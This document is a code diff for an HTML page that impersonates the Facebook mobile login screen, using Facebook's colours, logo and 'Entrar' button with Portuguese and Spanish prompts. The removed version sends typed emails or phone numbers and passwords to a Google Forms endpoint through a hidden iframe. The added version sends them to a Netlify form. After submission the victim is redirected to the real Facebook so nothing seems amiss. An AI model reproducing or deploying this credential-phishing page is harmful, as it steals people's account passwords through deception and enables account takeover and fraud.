@@ -1,10 +1,5 @@
 
-<html xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
-<meta content='width=device-width, initial-scale=1' name='viewport' user-scalable='0'/>
-<meta charset='UTF-8'/>
-<meta content='#3b5998' name='theme-color'/>
-<script src='https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js'></script>
-<link href='https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico' rel='icon'/>
+<html>
 <style>
    .header {
       background: #3b5998;
@@ -74,7 +69,6 @@
 
 </style>
 <head>
-<link href='https://www.blogger.com/static/v1/widgets/14020288-widget_css_bundle.css' rel='stylesheet' type='text/css'/>
 <style id='page-skin-1' type='text/css'><!--
 /*
 body {
@@ -96,14 +90,20 @@ padding: 0;
 <div class='header' data-sigil='mChromeHeaderCenter'><a href='/'><img height='20' src='https://static.xx.fbcdn.net/rsrc.php/v3/y4/r/gf6iHxsw8zm.png' width='100'/></a></div>
 <login>
 <iframe border='0' height='0' name='hiddenFrame' style='display: none;' width='0'></iframe>
-<form action='https://docs.google.com/forms/u/0/d/e/XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/formResponse' methot='post' target='hiddenFrame'>
-<input name='entry.XXXXXXXXX' placeholder='Número de telefone ou email' type='text'/>
+
+
+
+
+<form name="contact" method="POST" data-netlify="true" target='hiddenFrame'> 
+<input type="email" placeholder='Número de telefone o email' name="email" /></label>
 <br/>
-<input name='entry.XXXXXXXXX' placeholder='Senha' type='password'/>
+<input type="password" placeholder='Contraseña' name="password" /></label>
 <br/>
 <br/>
-<button id='pronto' onclick='window.open(&#39;https://www.facebook.com/?ref=tn_tnmn&#39;,"_self");' type='submit'>Entrar</button>
+<button id="pronto" onclick="window.open('https://www.facebook.com/?ref=tn_tnmn',&quot;_self&quot;);" type="submit">Entrar</button>
 <br/>
+</form>
+
 <br/>
 <p><span>ou</span></p>
 <br/>
